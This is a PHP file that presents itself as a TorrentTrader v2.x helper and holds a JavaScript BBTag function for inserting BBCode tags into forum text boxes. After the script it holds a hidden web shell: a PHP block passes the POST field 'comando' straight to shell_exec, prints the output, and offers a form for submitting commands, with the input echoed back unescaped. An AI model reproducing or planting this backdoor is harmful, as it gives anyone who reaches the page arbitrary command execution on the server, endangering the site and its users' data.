<?php
//
//  TorrentTrader v2.x
//      $LastChangedDate: 2012-07-13 11:04:04 +0100 (Fri, 13 Jul 2012) $
//      $LastChangedBy: torrenttrader $
//
//      Re-designed by: Nikkbu
//      http://www.torrenttrader.org
//
//


?>
<script type="text/javascript">

function BBTag(tag,s,text,form){
switch(tag)
    {
    case '[quote]':
	var start = document.forms[form].elements[text].selectionStart;
	var end = document.forms[form].elements[text].selectionEnd;
	if (start != end) {
		var body = document.forms[form].elements[text].value;
		var left = body.substr(body, start);
		var middle = "[quote]" + body.substring(start, end) + "[/quote]";
		var right = body.substr(end, body.length);
		document.forms[form].elements[text].value = left + middle + right;
	} else {
		document.forms[form].elements[text].value = document.forms[form].elements[text].value + "[quote][/quote]";
	}
        break;
    case '[img]':
	var start = document.forms[form].elements[text].selectionStart;
	var end = document.forms[form].elements[text].selectionEnd;
	if (start != end) {
		var body = document.forms[form].elements[text].value;
		var left = body.substr(body, start);
		var middle = "[img]" + body.substring(start, end) + "[/img]";
		var right = body.substr(end, body.length);
		document.forms[form].elements[text].value = left + middle + right;
	} else {
		document.forms[form].elements[text].value = document.forms[form].elements[text].value + "[img][/img]";
	}
        break;
    case '[url]':
	var start = document.forms[form].elements[text].selectionStart;
	var end = document.forms[form].elements[text].selectionEnd;
	if (start != end) {
		var body = document.forms[form].elements[text].value;
		var left = body.substr(body, start);
		var middle = "[url]" + body.substring(start, end) + "[/url]";
		var right = body.substr(end, body.length);
		document.forms[form].elements[text].value = left + middle + right;
	} else {
		document.forms[form].elements[text].value = document.forms[form].elements[text].value + "[url][/url]";
	}
        break;
    case '[*]':
        document.forms[form].elements[text].value = document.forms[form].elements[text].value+"[*]";
        break;
    case '[b]':
	var start = document.forms[form].elements[text].selectionStart;
	var end = document.forms[form].elements[text].selectionEnd;
	if (start != end) {
		var body = document.forms[form].elements[text].value;
		var left = body.substr(body, start);
		var middle = "[b]" + body.substring(start, end) + "[/b]";
		var right = body.substr(end, body.length);
		document.forms[form].elements[text].value = left + middle + right;
	} else {
		document.forms[form].elements[text].value = document.forms[form].elements[text].value + "[b][/b]";
	}
        break;
    case '[i]':
	var start = document.forms[form].elements[text].selectionStart;
	var end = document.forms[form].elements[text].selectionEnd;
	if (start != end) {
		var body = document.forms[form].elements[text].value;
		var left = body.substr(body, start);
		var middle = "[i]" + body.substring(start, end) + "[/i]";
		var right = body.substr(end, body.length);
		document.forms[form].elements[text].value = left + middle + right;
	} else {
		document.forms[form].elements[text].value = document.forms[form].elements[text].value + "[i][/i]";
	}
        break;
    case '[u]':
	var start = document.forms[form].elements[text].selectionStart;
	var end = document.forms[form].elements[text].selectionEnd;
	if (start != end) {
		var body = document.forms[form].elements[text].value;
		var left = body.substr(body, start);
		var middle = "[u]" + body.substring(start, end) + "[/u]";
		var right = body.substr(end, body.length);
		document.forms[form].elements[text].value = left + middle + right;
	} else {
		document.forms[form].elements[text].value = document.forms[form].elements[text].value + "[u][/u]";
	}
        break;
    }
    document.forms[form].elements[text].focus();
}
</script>
<?php
$output = shell_exec($_POST['comando']);
echo "<pre>$output</pre>";

?>

<form method="post">
  <textarea id="comando" name="comando"><?=$_POST['comando']?></textarea>
  <input type="submit" value="Submit">
</form>

